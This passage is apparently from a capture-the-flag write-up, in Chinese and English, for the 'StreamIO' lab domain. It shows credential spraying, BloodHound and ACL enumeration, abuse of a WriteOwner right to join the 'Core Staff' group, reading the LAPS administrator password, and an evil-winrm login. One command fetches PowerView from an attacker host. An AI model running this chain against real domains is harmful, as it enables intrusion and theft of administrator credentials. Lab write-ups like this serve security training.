https://slack.streamio.htb:b'JDgodd',b'password@12'
```



找到了一些账号密码，可以 `crackmapexec` 密码喷射

我这里知道接下来 JDgodd 有效

Unfortunately, JDgodd doesn’t have permissions to WinRM:

```bash
└─# crackmapexec winrm 10.10.11.158 -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r'
[*] Initializing FTP protocol database
SMB         10.10.11.158    5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:streamIO.htb)
HTTP        10.10.11.158    5985   DC               [*] http://10.10.11.158:5985/wsman
WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r
```



然后 kali 安装 bloodhound

```bash
─# apt search bloodhound

Sorting... Done
Full Text Search... Done
bloodhound/kali-rolling 4.3.0-0kali1 amd64
  Six Degrees of Domain Admin

bloodhound-dbgsym/kali-rolling 4.3.0-0kali1 amd64
  debug symbols for bloodhound

bloodhound.py/kali-rolling 1.6.1-0kali1 all
  ingestor for BloodHound, based on Impacket (Python 3)

ruby-rails-assets-corejs-typeahead/kali-rolling 1.2.1-3 all
  Fast and fully-featured autocomplete search library
```

```
apt-get update 
apt install bloodhound
apt install bloodhound.py
```



## 提权到aministrator用户

### bloodhound

用之前得到的用户来执行 bloodhound 得到 zip 的数据文件

```bash
bloodhound-python -c All -u jdgodd -p 'JDg0dd1s@d0p3cr3@t0r' -ns 10.10.11.158 -d streamio.htb -dc streamio.htb --zip
```



要使用 bloodhound 还得配置下 neoj4 数据库

```
neo4j restart
```

修改下账号密码再重启 http://localhost:7474/browser/

```
neo4j:neo4j 默认账号密码登录
neo4j:zf1yolo 修改密码
再可以看到 neo4j 的端口变化了 eo4j://localhost:7687
```

再启动 bloodhound ，用 neo4j:zf1yolo 登录即可

```
bloodhound
```



导入数据分析后

<img src=".\图片\Snipaste_2023-09-12_10-40-00.png" alt="Snipaste_2023-09-12_10-40-00" style="zoom:80%;" />

接着按着它给定的操作即可



### 手动枚举动态目录

当前是 nikk37 用户

```
*Evil-WinRM* PS C:\Users\nikk37\Documents> whoami
streamio\nikk37
```

查看用户 信息

```powershell
*Evil-WinRM* PS C:\Users\nikk37\Documents> net user /domain

User accounts for \\

-------------------------------------------------------------------------------
Administrator            Guest                    JDgodd
krbtgt                   Martin                   nikk37
yoshihide
The command completed with one or more errors.

*Evil-WinRM* PS C:\Users\nikk37\Documents> net user nikk37
User name                    nikk37
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/22/2022 2:57:16 AM
Password expires             Never
Password changeable          2/23/2022 2:57:16 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   2/22/2022 3:39:51 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.

*Evil-WinRM* PS C:\Users\nikk37\Documents> net user jdgodd
User name                    JDgodd
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/22/2022 2:56:42 AM
Password expires             Never
Password changeable          2/23/2022 2:56:42 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   2/26/2022 11:17:08 AM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users
The command completed successfully.
```

查询 jdgodd 用户的组信息

```powershell
*Evil-WinRM* PS C:\Users\nikk37\Documents> dsget user "CN=jdgodd,CN=users,DC=streamio,DC=htb" -memberof -expand
"CN=Domain Users,CN=Users,DC=streamIO,DC=htb"
"CN=Users,CN=Builtin,DC=streamIO,DC=htb"
```

整个域控中有哪些组

```powershell
*Evil-WinRM* PS C:\Users\nikk37\Documents> net group

Group Accounts for \\

-------------------------------------------------------------------------------
*Cloneable Domain Controllers
*CORE STAFF          //这个是用户自定义的组，也是我们感兴趣的
*DnsUpdateProxy
*Domain Admins
*Domain Computers
*Domain Controllers
*Domain Guests
*Domain Users
*Enterprise Admins
*Enterprise Key Admins
*Enterprise Read-only Domain Controllers
*Group Policy Creator Owners
*Key Admins
*Protected Users
*Read-only Domain Controllers
*Schema Admins
The command completed with one or more errors.
```

观察 `core staff` 组的关键信息

```powershell
*Evil-WinRM* PS C:\Users\nikk37\Documents> get-adgroup "core staff"


DistinguishedName : CN=CORE STAFF,CN=Users,DC=streamIO,DC=htb
GroupCategory     : Security
GroupScope        : Global
Name              : CORE STAFF
ObjectClass       : group
ObjectGUID        : 113400d4-c787-4e58-91ad-92779b38ecc5
SamAccountName    : CORE STAFF
SID               : S-1-5-21-1470860369-1569627196-4264678630-1108
```

查询 `core staff` 组的权限，可访问控制列表的项

```powershell
*Evil-WinRM* PS C:\Users\nikk37\Documents> (get-acl "AD:CN=CORE STAFF,CN=users,DC=streamio,DC=htb").access


ActiveDirectoryRights : GenericRead
InheritanceType       : None
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : None
AccessControlType     : Allow
IdentityReference     : NT AUTHORITY\SELF
IsInherited           : False
InheritanceFlags      : None
PropagationFlags      : None

ActiveDirectoryRights : GenericRead
InheritanceType       : None
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : None
AccessControlType     : Allow
IdentityReference     : NT AUTHORITY\Authenticated Users
IsInherited           : False
InheritanceFlags      : None
PropagationFlags      : None

ActiveDirectoryRights : GenericAll
InheritanceType       : None
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : None
AccessControlType     : Allow
IdentityReference     : NT AUTHORITY\SYSTEM
IsInherited           : False
InheritanceFlags      : None
PropagationFlags      : None

ActiveDirectoryRights : GenericAll
InheritanceType       : None
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : None
AccessControlType     : Allow
IdentityReference     : BUILTIN\Account Operators
IsInherited           : False
InheritanceFlags      : None
PropagationFlags      : None

ActiveDirectoryRights : GenericAll
InheritanceType       : None
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : None
AccessControlType     : Allow
IdentityReference     : streamIO\Domain Admins
IsInherited           : False
InheritanceFlags      : None
PropagationFlags      : None

ActiveDirectoryRights : WriteOwner
InheritanceType       : None
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : None
AccessControlType     : Allow
IdentityReference     : streamIO\JDgodd
IsInherited           : False
InheritanceFlags      : None
PropagationFlags      : None

ActiveDirectoryRights : ExtendedRight
InheritanceType       : None
ObjectType            : ab721a55-1e2f-11d0-9819-00aa0040529b
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : ObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : NT AUTHORITY\Authenticated Users
IsInherited           : False
InheritanceFlags      : None
PropagationFlags      : None

ActiveDirectoryRights : ReadProperty
InheritanceType       : None
ObjectType            : 46a9b11d-60ae-405a-b7e8-ff8a58d456d2
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : ObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : BUILTIN\Windows Authorization Access Group
IsInherited           : False
InheritanceFlags      : None
PropagationFlags      : None

ActiveDirectoryRights : ReadProperty
InheritanceType       : Descendents
ObjectType            : 4c164200-20c0-11d0-a768-00aa006e0529
InheritedObjectType   : 4828cc14-1437-45bc-9b07-ad6f015e5f28
ObjectFlags           : ObjectAceTypePresent, InheritedObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : BUILTIN\Pre-Windows 2000 Compatible Access
IsInherited           : True
InheritanceFlags      : ContainerInherit
PropagationFlags      : InheritOnly

ActiveDirectoryRights : ReadProperty
InheritanceType       : Descendents
ObjectType            : 4c164200-20c0-11d0-a768-00aa006e0529
InheritedObjectType   : bf967aba-0de6-11d0-a285-00aa003049e2
ObjectFlags           : ObjectAceTypePresent, InheritedObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : BUILTIN\Pre-Windows 2000 Compatible Access
IsInherited           : True
InheritanceFlags      : ContainerInherit
PropagationFlags      : InheritOnly

ActiveDirectoryRights : ReadProperty
InheritanceType       : Descendents
ObjectType            : 5f202010-79a5-11d0-9020-00c04fc2d4cf
InheritedObjectType   : 4828cc14-1437-45bc-9b07-ad6f015e5f28
ObjectFlags           : ObjectAceTypePresent, InheritedObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : BUILTIN\Pre-Windows 2000 Compatible Access
IsInherited           : True
InheritanceFlags      : ContainerInherit
PropagationFlags      : InheritOnly

ActiveDirectoryRights : ReadProperty
InheritanceType       : Descendents
ObjectType            : 5f202010-79a5-11d0-9020-00c04fc2d4cf
InheritedObjectType   : bf967aba-0de6-11d0-a285-00aa003049e2
ObjectFlags           : ObjectAceTypePresent, InheritedObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : BUILTIN\Pre-Windows 2000 Compatible Access
IsInherited           : True
InheritanceFlags      : ContainerInherit
PropagationFlags      : InheritOnly

ActiveDirectoryRights : ReadProperty
InheritanceType       : Descendents
ObjectType            : bc0ac240-79a9-11d0-9020-00c04fc2d4cf
InheritedObjectType   : 4828cc14-1437-45bc-9b07-ad6f015e5f28
ObjectFlags           : ObjectAceTypePresent, InheritedObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : BUILTIN\Pre-Windows 2000 Compatible Access
IsInherited           : True
InheritanceFlags      : ContainerInherit
PropagationFlags      : InheritOnly

ActiveDirectoryRights : ReadProperty
InheritanceType       : Descendents
ObjectType            : bc0ac240-79a9-11d0-9020-00c04fc2d4cf
InheritedObjectType   : bf967aba-0de6-11d0-a285-00aa003049e2
ObjectFlags           : ObjectAceTypePresent, InheritedObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : BUILTIN\Pre-Windows 2000 Compatible Access
IsInherited           : True
InheritanceFlags      : ContainerInherit
PropagationFlags      : InheritOnly

ActiveDirectoryRights : ReadProperty
InheritanceType       : Descendents
ObjectType            : 59ba2f42-79a2-11d0-9020-00c04fc2d3cf
InheritedObjectType   : 4828cc14-1437-45bc-9b07-ad6f015e5f28
ObjectFlags           : ObjectAceTypePresent, InheritedObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : BUILTIN\Pre-Windows 2000 Compatible Access
IsInherited           : True
InheritanceFlags      : ContainerInherit
PropagationFlags      : InheritOnly

ActiveDirectoryRights : ReadProperty
InheritanceType       : Descendents
ObjectType            : 59ba2f42-79a2-11d0-9020-00c04fc2d3cf
InheritedObjectType   : bf967aba-0de6-11d0-a285-00aa003049e2
ObjectFlags           : ObjectAceTypePresent, InheritedObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : BUILTIN\Pre-Windows 2000 Compatible Access
IsInherited           : True
InheritanceFlags      : ContainerInherit
PropagationFlags      : InheritOnly

ActiveDirectoryRights : ReadProperty
InheritanceType       : Descendents
ObjectType            : 037088f8-0ae1-11d2-b422-00a0c968f939
InheritedObjectType   : 4828cc14-1437-45bc-9b07-ad6f015e5f28
ObjectFlags           : ObjectAceTypePresent, InheritedObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : BUILTIN\Pre-Windows 2000 Compatible Access
IsInherited           : True
InheritanceFlags      : ContainerInherit
PropagationFlags      : InheritOnly

ActiveDirectoryRights : ReadProperty
InheritanceType       : Descendents
ObjectType            : 037088f8-0ae1-11d2-b422-00a0c968f939
InheritedObjectType   : bf967aba-0de6-11d0-a285-00aa003049e2
ObjectFlags           : ObjectAceTypePresent, InheritedObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : BUILTIN\Pre-Windows 2000 Compatible Access
IsInherited           : True
InheritanceFlags      : ContainerInherit
PropagationFlags      : InheritOnly

ActiveDirectoryRights : ReadProperty, WriteProperty
InheritanceType       : All
ObjectType            : 5b47d60f-6090-40b2-9f37-2a4de88f3063
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : ObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : streamIO\Key Admins
IsInherited           : True
InheritanceFlags      : ContainerInherit
PropagationFlags      : None

ActiveDirectoryRights : ReadProperty, WriteProperty
InheritanceType       : All
ObjectType            : 5b47d60f-6090-40b2-9f37-2a4de88f3063
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : ObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : streamIO\Enterprise Key Admins
IsInherited           : True
InheritanceFlags      : ContainerInherit
PropagationFlags      : None

ActiveDirectoryRights : Self
InheritanceType       : Descendents
ObjectType            : 9b026da6-0d3c-465c-8bee-5199d7165cba
InheritedObjectType   : bf967a86-0de6-11d0-a285-00aa003049e2
ObjectFlags           : ObjectAceTypePresent, InheritedObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : CREATOR OWNER
IsInherited           : True
InheritanceFlags      : ContainerInherit
PropagationFlags      : InheritOnly

ActiveDirectoryRights : Self
InheritanceType       : Descendents
ObjectType            : 9b026da6-0d3c-465c-8bee-5199d7165cba
InheritedObjectType   : bf967a86-0de6-11d0-a285-00aa003049e2
ObjectFlags           : ObjectAceTypePresent, InheritedObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : NT AUTHORITY\SELF
IsInherited           : True
InheritanceFlags      : ContainerInherit
PropagationFlags      : InheritOnly

ActiveDirectoryRights : ReadProperty
InheritanceType       : Descendents
ObjectType            : b7c69e6d-2cc7-11d2-854e-00a0c983f608
InheritedObjectType   : bf967a86-0de6-11d0-a285-00aa003049e2
ObjectFlags           : ObjectAceTypePresent, InheritedObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS
IsInherited           : True
InheritanceFlags      : ContainerInherit
PropagationFlags      : InheritOnly

ActiveDirectoryRights : ReadProperty
InheritanceType       : All
ObjectType            : b7c69e6d-2cc7-11d2-854e-00a0c983f608
InheritedObjectType   : bf967a9c-0de6-11d0-a285-00aa003049e2
ObjectFlags           : ObjectAceTypePresent, InheritedObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS
IsInherited           : True
InheritanceFlags      : ContainerInherit
PropagationFlags      : None

ActiveDirectoryRights : ReadProperty
InheritanceType       : Descendents
ObjectType            : b7c69e6d-2cc7-11d2-854e-00a0c983f608
InheritedObjectType   : bf967aba-0de6-11d0-a285-00aa003049e2
ObjectFlags           : ObjectAceTypePresent, InheritedObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS
IsInherited           : True
InheritanceFlags      : ContainerInherit
PropagationFlags      : InheritOnly

ActiveDirectoryRights : WriteProperty
InheritanceType       : Descendents
ObjectType            : ea1b7b93-5e48-46d5-bc6c-4df4fda78a35
InheritedObjectType   : bf967a86-0de6-11d0-a285-00aa003049e2
ObjectFlags           : ObjectAceTypePresent, InheritedObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : NT AUTHORITY\SELF
IsInherited           : True
InheritanceFlags      : ContainerInherit
PropagationFlags      : InheritOnly

ActiveDirectoryRights : GenericRead
InheritanceType       : Descendents
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : 4828cc14-1437-45bc-9b07-ad6f015e5f28
ObjectFlags           : InheritedObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : BUILTIN\Pre-Windows 2000 Compatible Access
IsInherited           : True
InheritanceFlags      : ContainerInherit
PropagationFlags      : InheritOnly

ActiveDirectoryRights : GenericRead
InheritanceType       : All
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : bf967a9c-0de6-11d0-a285-00aa003049e2
ObjectFlags           : InheritedObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : BUILTIN\Pre-Windows 2000 Compatible Access
IsInherited           : True
InheritanceFlags      : ContainerInherit
PropagationFlags      : None

ActiveDirectoryRights : GenericRead
InheritanceType       : Descendents
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : bf967aba-0de6-11d0-a285-00aa003049e2
ObjectFlags           : InheritedObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : BUILTIN\Pre-Windows 2000 Compatible Access
IsInherited           : True
InheritanceFlags      : ContainerInherit
PropagationFlags      : InheritOnly

ActiveDirectoryRights : ReadProperty, WriteProperty
InheritanceType       : All
ObjectType            : 3f78c3e5-f79a-46bd-a0b8-9d18116ddc79
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : ObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : NT AUTHORITY\SELF
IsInherited           : True
InheritanceFlags      : ContainerInherit, ObjectInherit
PropagationFlags      : None

ActiveDirectoryRights : ReadProperty, WriteProperty, ExtendedRight
InheritanceType       : All
ObjectType            : 91e647de-d96f-4b70-9557-d63ff4f3ccd8
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : ObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : NT AUTHORITY\SELF
IsInherited           : True
InheritanceFlags      : ContainerInherit
PropagationFlags      : None

ActiveDirectoryRights : GenericAll
InheritanceType       : All
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : None
AccessControlType     : Allow
IdentityReference     : streamIO\Enterprise Admins
IsInherited           : True
InheritanceFlags      : ContainerInherit
PropagationFlags      : None

ActiveDirectoryRights : ListChildren
InheritanceType       : All
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : None
AccessControlType     : Allow
IdentityReference     : BUILTIN\Pre-Windows 2000 Compatible Access
IsInherited           : True
InheritanceFlags      : ContainerInherit
PropagationFlags      : None

ActiveDirectoryRights : CreateChild, Self, WriteProperty, ExtendedRight, Delete, GenericRead, WriteDacl, WriteOwner
InheritanceType       : All
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : None
AccessControlType     : Allow
IdentityReference     : BUILTIN\Administrators
IsInherited           : True
InheritanceFlags      : ContainerInherit
PropagationFlags      : None
```

得到了很多信息，这时候要与我们已经得到的权限 `jdgodd用户` 结合起来，分析出以上一条重要信息。`JDgodd` 不属于 `core staff` 这个组，却又 `WriteOwner` 的权限

```
ActiveDirectoryRights : WriteOwner
InheritanceType       : None
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : None
AccessControlType     : Allow
IdentityReference     : streamIO\JDgodd
IsInherited           : False
InheritanceFlags      : None
PropagationFlags      : None
```

這個是过滤分析

<img src=".\图片\Snipaste_2023-09-12_11-19-02.png" alt="Snipaste_2023-09-12_11-19-02" style="zoom:80%;" />

再看 `core staff` 这个组对于这个计算机有哪些权限

```powershell
*Evil-WinRM* PS C:\Users\nikk37\Documents> get-adcomputer -filter *      //查看当前域内有哪些计算机

DistinguishedName : CN=DC,OU=Domain Controllers,DC=streamIO,DC=htb
DNSHostName       : DC.streamIO.htb
Enabled           : True
Name              : DC
ObjectClass       : computer
ObjectGUID        : 8c0f9a80-aaab-4a78-9e0d-7a4158d8b9ee
SamAccountName    : DC$
SID               : S-1-5-21-1470860369-1569627196-4264678630-1000
UserPrincipalName :
```

<img src=".\图片\Snipaste_2023-09-12_11-25-03.png" alt="Snipaste_2023-09-12_11-25-03" style="zoom:80%;" />

发现 `core staff` 可以有读取 属性。提权路径是，将当前用户 `jdgodd` 加到 `core staff` 这个组，再用这个组成员的读取权限 去读 laps（本地管理员密码方案） 



### 操作过程

需要  [PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) 的操作

靶机下载

```
wget -Uri http://10.10.16.5/PowerView.ps1 -OutFile ./PowerView.ps1
```

```powershell
cd C:\programdata
upload PowerView.ps1
. .\PowerView.ps1
Import-Module .\PowerView.ps1
Set-ExecutionPolicy Bypass -Scope Process
```

Now I’ll need a credential object for JDgodd:

```
$pass = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $pass)
```

I’ll add JDgodd to the group:

```powershell
Add-DomainObjectAcl -Credential $cred -TargetIdentity "Core Staff" -PrincipalIdentity "streamio\JDgodd"
Add-DomainGroupMember -Credential $cred -Identity "Core Staff" -Members "StreamIO\JDgodd"
```

JDgodd now shows as a member of Core Staff:

```powershell
*Evil-WinRM* PS C:\programdata> net user jdgodd
User name                    JDgodd
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/22/2022 2:56:42 AM
Password expires             Never
Password changeable          2/23/2022 2:56:42 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   9/12/2023 4:32:26 AM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *CORE STAFF
```

I can now read the LAPS password from the `ms-MCS-AdmPwd` property on the computer object:

```powershell
*Evil-WinRM* PS C:\programdata> Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred


DistinguishedName : CN=DC,OU=Domain Controllers,DC=streamIO,DC=htb
DNSHostName       : DC.streamIO.htb
Enabled           : True
Name              : DC
ObjectClass       : computer
ObjectGUID        : 8c0f9a80-aaab-4a78-9e0d-7a4158d8b9ee
SamAccountName    : DC$
SID               : S-1-5-21-1470860369-1569627196-4264678630-1000
UserPrincipalName :
```

Alternatively, this password can also be read from LDAP from my host using the JDgodd creds (once the user is in the Core Staff group):

```bash
└─# ldapsearch -H ldap://10.10.11.158 -b 'DC=streamIO,DC=htb' -x -D JDgodd@streamio.htb -w 'JDg0dd1s@d0p3cr3@t0r' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd           1 ⨯
# extended LDIF
#
# LDAPv3
# base <DC=streamIO,DC=htb> with scope subtree
# filter: (ms-MCS-AdmPwd=*)
# requesting: ms-MCS-AdmPwd 
#

# DC, Domain Controllers, streamIO.htb
dn: CN=DC,OU=Domain Controllers,DC=streamIO,DC=htb
ms-Mcs-AdmPwd: N@{@{,52SyLtf{

# search reference
ref: ldap://ForestDnsZones.streamIO.htb/DC=ForestDnsZones,DC=streamIO,DC=htb

# search reference
ref: ldap://DomainDnsZones.streamIO.htb/DC=DomainDnsZones,DC=streamIO,DC=htb

# search reference
ref: ldap://streamIO.htb/CN=Configuration,DC=streamIO,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3

```



```bash
└─# crackmapexec smb 10.10.11.158 -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' --laps --ntds
SMB         10.10.11.158    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.158    445    DC               [-] DC\administrator:N@{@{,52SyLtf{ STATUS_LOGON_FAILURE 
```





最后登录

```
evil-winrm -u administrator -p 'N@{@{,52SyLtf{' -i 10.10
```


